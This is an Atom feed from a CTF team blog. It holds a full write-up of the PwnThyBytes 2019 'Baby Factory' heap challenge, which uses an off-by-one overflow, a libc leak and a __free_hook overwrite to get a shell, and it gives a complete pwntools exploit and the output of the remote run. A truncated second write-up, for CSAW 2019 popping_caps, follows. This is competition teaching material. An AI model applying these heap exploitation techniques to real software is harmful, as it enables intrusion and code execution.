<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TEAMROCKETIST</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://teamrocketist.github.io/"/>
  <updated>2019-10-02T22:02:09.648Z</updated>
  <id>https://teamrocketist.github.io/</id>
  
  <author>
    <name>TEAMROCKETIST</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[Pwn] PwnThyBytes 2019 - Baby Factory</title>
    <link href="https://teamrocketist.github.io/2019/09/30/Pwn-PwnThyBytes-2019-Baby-Factory/"/>
    <id>https://teamrocketist.github.io/2019/09/30/Pwn-PwnThyBytes-2019-Baby-Factory/</id>
    <published>2019-09-30T11:48:53.000Z</published>
    <updated>2019-10-02T22:02:09.648Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Baby Factory<br>100</p><p>Author: FedEx</p><p>In order to keep the world perfectly balanced, as all things should be, we’ve designed a management system.</p><p>Don’t forget, with great power comes great responsability!</p><p>Prove yourself worthy.</p><p>nc 137.117.216.128 13373</p><p><a href="https://pwnthybytes.ro/d07f3a196b/files/7fef1ca81ad5f5d94a9d33770c4dc913/babyfactory.zip?token=eyJ0ZWFtX2lkIjo1NjksInVzZXJfaWQiOjg1MSwiZmlsZV9pZCI6MjJ9.XZFtlA.IvGAFjdrM3k2dBHP8RBcXAvVJ0w" target="_blank" rel="noopener">here</a></p></blockquote><p>Another heap challenge, libc-2.23 is used so no <strong>tcache</strong> on this version .</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file babyfactory</span><br><span class="line">babyfactory: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=e40dbc48ecfd16e9c12a93c42520cf9f85e2671b, stripped</span><br></pre></td></tr></table></figure><p>With this we know:</p><ul><li>ELF compiled for x86_x64 architecture.</li><li>Dynamically linked.</li><li>Stripped (A little bit harder to reverse).</li></ul><p>As usual the next thing is to check the security of the binary<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec babyfactory</span><br><span class="line">[*] <span class="string">'/ctf/pwnthybytes2019/pwn/babyfactory/babyfactory'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p><p>Brief analysis of these protections:</p><ul><li>FULL RELRO (<strong>GOT</strong> entries are read only we can’t overwrite them)</li><li>STACK CANARY (The stack is protected with the canary if there is a stack overflow we need to find a way to <strong>leak</strong> it)</li><li>The Stack is not executable (We can’t execute shellcode, techniques like <strong>ROP</strong> can bypass this)</li><li>PIE (Position Independent Executable) is on (If we want to use rop we need a way to leak the base address)</li></ul><h3 id="Testing-the-binary"><a href="#Testing-the-binary" class="headerlink" title="Testing the binary"></a>Testing the binary</h3><p>The binary comes with the usual options on a normal heap challenge, create, edit,lists and eliminate.</p><p>Let’s start by doing static analysis on create and edit:<br><a data-fancybox="gallery" href="https://i.imgur.com/I0nAh0U.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/I0nAh0U.png" alt><br></a></p><p><strong>Delete doesn’t</strong> have any kind of vulnerability so <strong>no</strong> double free or use after free possible, print will show every <strong>allocated object</strong>, also on <strong>create</strong> we are limited to <strong>7 mallocs</strong> because of variable at <strong>piebase+0x202024</strong> , this variable increases at <strong>each allocation</strong> and goes up to <strong>7</strong>, after that <strong>no</strong> more allocations are allowed and the string “Too many, sorry” is shown.</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>We have some limitation on the sizes of the allocations we can only do <strong>0x68,0x69 and 0x10</strong> they all fall into <strong>fastbin range</strong> we can use <strong>off by one</strong> vulnerability to overflow the size of a chunk to be able to get a chunk greater than fastbin(0x81) this is useful to get freed to <strong>unsorted bin</strong> so we can get leak a <strong>libc</strong> address, we can also use this to manage to get <strong>arbitrary write</strong> by changing the pointer of char* name to the address we want for example free_hook and update its value into system to get a shell.</p><p>The memory layout on the heap will be a little weird because of the struct created, <strong>malloc(0x10)</strong> is to store the pointers/values of objects of the <strong>struct xpto</strong> normally when we are programming in c we do <strong>malloc(sizeof(struct xpto))</strong> sizeof(struct xpto) is equal to <strong>0x10</strong> and why? since we have a char<em> pointer and a long integer as objects of the struct it needs <strong>0x8 for the char</strong></em> and <strong>0x8 for the long int</strong> this makes 0x8+0x8=<strong>0x10</strong>.</p><p>This the view of a struct object in memory:<br><a data-fancybox="gallery" href="https://i.imgur.com/5YdkpUR.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/5YdkpUR.png" alt><br></a><br>The plan is:</p><ul><li>Malloc boy chunk A,B and C day value set to -1(0xfffffffff).</li><li>Edit will think A is a girl chunk we can use this to overflow the size of chunk B with 0x91.</li><li>Free chunk B (To achieve success on freeing this a fake chunk needs to be created at chunk B(name)) chunk will be inserted into unsorted bin updating fd and bk with libc addresses.</li><li>Next malloc will be placed right above of the freed chunk(chunk_overlap). </li><li>Leak libc with print.</li><li>Overflow again the size of 0x21 but this time to 0x71 by editing chunk A again.</li><li>Freeing chunk B will put this into a fastbin.</li><li>Use next boy allocation to update the new 0x21 chunk to 0x71 to prevent errors from security check for the next malloc.</li><li>Next allocated boy chunk will be placed right at the char* name pointer of chunk B, modify it with free_hook pointer.</li><li>By editing chunk B we will write into the char* name pointer which got modified previously by us into free_hook set it into system.</li><li>Edit chunk A data into ‘/bin/sh\x00’</li><li>Free chunk A to Trigger free_hook and get a shell.</li></ul><h3 id="Off-by-One"><a href="#Off-by-One" class="headerlink" title="Off by One"></a>Off by One</h3><p>Lets start by allocate 3 chunks with</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">'A'</span>*<span class="number">0x8</span>, <span class="number">0xffffffff</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">'B'</span>*<span class="number">0x8</span>, <span class="number">0xffffffff</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">"C"</span>*<span class="number">0x8</span>, <span class="number">0xffffffff</span>) <span class="comment"># 2</span></span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" href="https://i.imgur.com/XZuG6S8.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/XZuG6S8.png" alt><br></a><br>Now we want to overwrite chunk B(0x21) size to 0x91 this way we can make this chunk into unsortedbin range:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0x0</span>, <span class="string">'\x91'</span>*<span class="number">0x69</span>)</span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" href="https://i.imgur.com/L6Sh7UP.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/L6Sh7UP.png" alt><br></a><br>Lets see what happens when we free this chunk:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" href="https://i.imgur.com/7pFQP8A.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/7pFQP8A.png" alt><br></a><br>Now lets malloc<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">'\xb0'</span>, <span class="number">0xffffffff</span>) <span class="comment"># 1</span></span><br></pre></td></tr></table></figure></p><p><a data-fancybox="gallery" href="https://i.imgur.com/j2wo7wk.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/j2wo7wk.png" alt><br></a><br>Now we can get libc address from index 1:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">list()</span><br><span class="line">r.recvuntil(<span class="string">'[1] GIRL= '</span>)</span><br><span class="line">addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">LIBC = addr<span class="number">-0x3c4bb0</span></span><br><span class="line">FREE_HOOK = LIBC+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">SYSTEM = LIBC+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.info(<span class="string">"LEAKED 0x%x"</span>, addr)</span><br><span class="line">log.info(<span class="string">"LIBC 0x%x"</span>, LIBC)</span><br><span class="line">log.info(<span class="string">"FREE_HOOK 0x%x"</span>, FREE_HOOK)</span><br></pre></td></tr></table></figure><p>Now it’s time to overflow chunk B again but this time to 0x71 and free it:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0x0</span>, <span class="string">'\x71'</span>*<span class="number">0x69</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" href="https://i.imgur.com/muJzhNH.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/muJzhNH.png" alt><br></a><br>This is what happens if we don’t create that fake chunk at that location:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ root@ptb:/ctf/work/pwn/babyfactory<span class="comment"># python babyfactory.py</span></span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/babyfactory/babyfactory'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./babyfactory'</span>: pid 8668</span><br><span class="line">[*] LEAKED 0x7f0f80e67bb0</span><br><span class="line">[*] LIBC 0x7f0f80aa3000</span><br><span class="line">[*] FREE_HOOK 0x7f0f80e697a8</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">*** Error <span class="keyword">in</span> `./babyfactory<span class="string">': free(): invalid next size (fast): 0x000055b286da70a0 ***</span></span><br></pre></td></tr></table></figure><p>Next size is zero making it an invalid size lets check the code in <a href="https://github.com/andigena/glibc-2.23-0ubuntu3/blob/master/malloc/malloc.c#L3909" target="_blank" rel="noopener">malloc.c</a>:<br><a data-fancybox="gallery" href="https://i.imgur.com/3tjCD3E.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/3tjCD3E.png" alt><br></a><br>Lets fix this by adjusting in the beginning of our script:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">'A'</span>*<span class="number">0x8</span>, <span class="number">0xffffffff</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0x71</span>), <span class="number">0xffffffff</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">"C"</span>*<span class="number">0x8</span>, <span class="number">0xffffffff</span>) <span class="comment"># 2  separate the released chunk from the top chunk.</span></span><br></pre></td></tr></table></figure><p>Now free will work and we get this :<br><a data-fancybox="gallery" href="https://i.imgur.com/DmgxuqH.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/DmgxuqH.png" alt><br></a><br>Now next malloc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>, p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>),<span class="number">0xffffffff</span>) <span class="comment"># 1</span></span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" href="https://i.imgur.com/7pXnJ0R.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/7pXnJ0R.png" alt><br></a><br>As explained in the picture above p64(0)+p64(0)+p64(0)+p64(0x71) to bypass <a href="https://github.com/andigena/glibc-2.23-0ubuntu3/blob/master/malloc/malloc.c#L3384" target="_blank" rel="noopener">this</a> security check:<br><a data-fancybox="gallery" href="https://i.imgur.com/cJOOtIc.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/cJOOtIc.png" alt><br></a><br>Remember fastbin(0x70) is something like this right now:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x70: 0x5620cb07a0b0 —▸ 0x5620cb07a0a0 ◂— 0x0</span><br></pre></td></tr></table></figure><p>Remember before we exchanged the size to 0x91 the old size was 0x21 this means that this was place that stored the pointers of the structure which means if we modify the first field of this chunk we will change the pointer of <strong>char* name</strong> into <strong>free_hook</strong> next edit will write directly into free_hook giving us an arbitrary write free of security checks:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>, p64(FREE_HOOK),<span class="number">0xffffffff</span>) <span class="comment"># 3</span></span><br></pre></td></tr></table></figure><p>The look of the heap before the 1st pointer gets updated to free_hook:<br><a data-fancybox="gallery" href="https://i.imgur.com/EWP9H1C.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/EWP9H1C.png" alt><br></a><br>The look after update to free_hook occurs:<br><a data-fancybox="gallery" href="https://i.imgur.com/dsuVkAW.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/dsuVkAW.png" alt><br></a><br>Now setting free_hook into system putting “/bin/sh” into index 0 , by freeing index 0 we trigger free_hook and get a shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">1</span>, p64(SYSTEM))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>The full exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">host, port = <span class="string">"137.117.216.128"</span>, <span class="string">"13373"</span></span><br><span class="line">filename = <span class="string">"./babyfactory"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(PIE+x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(obj, name, day)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">'[5] Abandon Baby\n &gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'[2] Girl \n &gt; '</span>,str(obj))</span><br><span class="line">r.sendafter(<span class="string">'Enter Name: '</span>, name)</span><br><span class="line">r.sendlineafter(<span class="string">'Enter Day: '</span>, str(day))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, name)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">'[5] Abandon Baby\n &gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'Enter Baby IDX: '</span>, str(index))</span><br><span class="line">r.sendafter(<span class="string">'Enter new name: '</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list</span><span class="params">()</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">'[5] Abandon Baby\n &gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">'[5] Abandon Baby\n &gt; '</span>,<span class="string">'4'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'Enter Baby IDX: '</span>, str(index))</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">r = getConn()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">debug([<span class="number">0xc7b</span>,<span class="number">0x1072</span>]) <span class="comment"># malloc 0xc7b malloc 0xc88 free 0x1072 edit 0xf92</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">'A'</span>*<span class="number">0x8</span>, <span class="number">0xffffffff</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0x71</span>), <span class="number">0xffffffff</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">"C"</span>*<span class="number">0x8</span>, <span class="number">0xffffffff</span>) <span class="comment"># 2  separate the released chunk from the top chunk.</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x0</span>, <span class="string">'\x91'</span>*<span class="number">0x69</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">'\xb0'</span>, <span class="number">0xffffffff</span>) <span class="comment"># 1</span></span><br><span class="line">list()</span><br><span class="line">r.recvuntil(<span class="string">'[1] GIRL= '</span>)</span><br><span class="line">addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">LIBC = addr<span class="number">-0x3c4bb0</span></span><br><span class="line">FREE_HOOK = LIBC+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">SYSTEM = LIBC+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.info(<span class="string">"LEAKED 0x%x"</span>, addr)</span><br><span class="line">log.info(<span class="string">"LIBC 0x%x"</span>, LIBC)</span><br><span class="line">log.info(<span class="string">"FREE_HOOK 0x%x"</span>, FREE_HOOK)</span><br><span class="line">edit(<span class="number">0x0</span>, <span class="string">'\x71'</span>*<span class="number">0x69</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>),<span class="number">0xffffffff</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">1</span>, p64(FREE_HOOK),<span class="number">0xffffffff</span>) <span class="comment"># 3</span></span><br><span class="line">edit(<span class="number">1</span>, p64(SYSTEM))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><p>Running it:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ python babyfactory.py REMOTE</span><br><span class="line">[*] <span class="string">'/ctf/pwnthybytes2019/pwn/babyfactory/babyfactory'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">'/ctf/pwnthybytes2019/pwn/babyfactory/libc-2.23.so'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to 137.117.216.128 on port 13373: Done</span><br><span class="line">[*] LEAKED 0x7fec914ecbb0</span><br><span class="line">[*] LIBC 0x7fec91128000</span><br><span class="line">[*] FREE_HOOK 0x7fec914ee7a8</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat home/babyfactory/flag</span><br><span class="line">PTBCTF&#123;d516da8f4726509484aa98eabd8e095f&#125;</span><br></pre></td></tr></table></figure></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Baby Factory&lt;br&gt;100&lt;/p&gt;
&lt;p&gt;Author: FedEx&lt;/p&gt;
&lt;p&gt;In order to keep the world perfectly balanced, as all things should be, we’v
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Glibc Malloc" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"/>
    
      <category term="Off By One" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Off-By-One/"/>
    
    
      <category term="off_by_one" scheme="https://teamrocketist.github.io/tags/off-by-one/"/>
    
      <category term="heap" scheme="https://teamrocketist.github.io/tags/heap/"/>
    
      <category term="pwnthybytes2019" scheme="https://teamrocketist.github.io/tags/pwnthybytes2019/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] csaw 2019 - popping_caps</title>
    <link href="https://teamrocketist.github.io/2019/09/16/Pwn-csaw-2019-popping-caps/"/>
    <id>https://teamrocketist.github.io/2019/09/16/Pwn-csaw-2019-popping-caps/</id>
    <published>2019-09-16T00:59:30.000Z</published>
    <updated>2019-09-17T04:57:06.787Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>popping_caps</p></blockquote><blockquote><p><strong>Description</strong>:<br>350</p><p>You ever wonder why cowboys have 7-shooters and not an even number?</p><p>nc pwn.chal.csaw.io 1001<br><a href="https://mega.nz/#!ymhhFKCI!HZis0PrFmtM78_tCyfcAPgzeh9n5YXQVcz4CdU8KrPw" target="_blank" rel="noopener">popping_caps</a><br><a href="https://mega.nz/#!G2xVEarZ!anZNnHzaeognifxS4pJirf3S_G3n51JCbHZR0woYu80" target="_blank" rel="noopener">libc.so.6</a></p></blockquote><h3 id="Analysing-the-binary"><a href="#Analysing-the-binary" class="headerlink" title="Analysing the binary"></a>Analysing the binary</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec popping_caps</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/popping_caps/popping_caps'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" href="https://i.imgur.com/dPwQZzE.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/dPwQZzE.png" alt><br></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file popping_caps</span><br><span class="line">popping_caps: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=0b94b47318011a2516372524e7aaa0caeda06c79, not stripped</span><br></pre></td></tr></table></figure><p>Running and testing the binary:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ./popping_caps </span><br><span class="line">Here is system 0x7f9bcaead440</span><br><span class="line">You have 7 caps!</span><br><span class="line">[1] Malloc</span><br><span class="line">[2] Free</span><br><span class="line">[3] Write</span><br><span class="line">[4] Bye</span><br><span class="line">Your choice:</span><br></pre></td></tr></table></figure><p>We can see from the beginning we already have libc leaked! So we don’t even need to worry about that besides that we have 4 options we can malloc, free, write and exit.</p><h3 id="Finding-the-vulnerability"><a href="#Finding-the-vulnerability" class="headerlink" title="Finding the vulnerability"></a>Finding the vulnerability</h3><p>Free Libc<br><a data-fancybox="gallery" href="https://i.imgur.com/7EfzmYS.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/7EfzmYS.png" alt><br></a><br>Main Function<br><a data-fancybox="gallery" href="https://i.imgur.com/nMkTPsf.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/nMkTPsf.png" alt><br></a><br>Bye Function<br><a data-fancybox="gallery" href="https://i.imgur.com/6ImPr6s.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/6ImPr6s.png" alt><br></a></p><h3 id="Exploit-plan"><a 